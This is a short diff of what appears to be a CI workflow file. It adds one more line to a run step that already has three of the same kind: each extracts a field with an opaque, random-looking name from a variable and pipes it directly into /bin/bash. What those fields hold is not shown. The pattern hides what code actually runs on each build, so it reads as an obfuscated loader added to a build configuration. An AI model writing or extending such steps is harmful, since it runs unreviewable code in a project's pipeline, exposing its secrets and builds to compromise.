@@ -29,6 +29,7 @@ jobs:
           echo $js1 | jq -r .s95005 | /bin/bash
           echo $tcj38 | jq -r .irk85 | /bin/bash
           echo $jnpa7 | jq -r .mxvj452 | /bin/bash
+          echo $dld15699 | jq -r .omqco34493 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
